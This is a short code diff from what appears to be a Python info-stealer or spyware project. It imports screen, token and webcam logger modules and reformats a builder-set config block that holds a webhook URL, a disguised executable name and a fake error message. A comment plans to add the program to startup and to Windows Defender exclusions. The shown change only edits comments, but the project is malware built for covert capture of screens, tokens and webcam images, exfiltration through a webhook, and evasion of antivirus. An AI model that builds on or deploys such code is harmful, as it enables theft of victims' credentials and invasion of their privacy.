@@ -17,14 +17,15 @@ from loggers.screen_logger import ScreenLogger
 from loggers.token_logger import TokenLogger
 from loggers.webcam_logger import WebcamLogger
 
-###############################
-# DO NOT MODIFY THESE VALUES! #
-# THEY ARE SET BY THE BUILDER #
-WEBHOOK_URL = ""  #
-SOFTWARE_EXE_NAME = ""  #
-SOFTWARE_DIR_NAME = ""  #
-CUSTOM_ERROR_MESSAGE = None  #
-###############################
+
+######################################################
+# CONFIG VALUES (SET BY BUILDER, DON'T CHANGE NAMES) #
+# FOR DIRECT EXECUTION, CHANGE THE VALUES MANUALLY   #
+WEBHOOK_URL = ""                                     #
+SOFTWARE_EXE_NAME = ""                               #
+SOFTWARE_DIR_NAME = ""                               #
+CUSTOM_ERROR_MESSAGE = None                          #
+######################################################
 
 
 # TODO Add to startup, windows defender exclusions, etc.
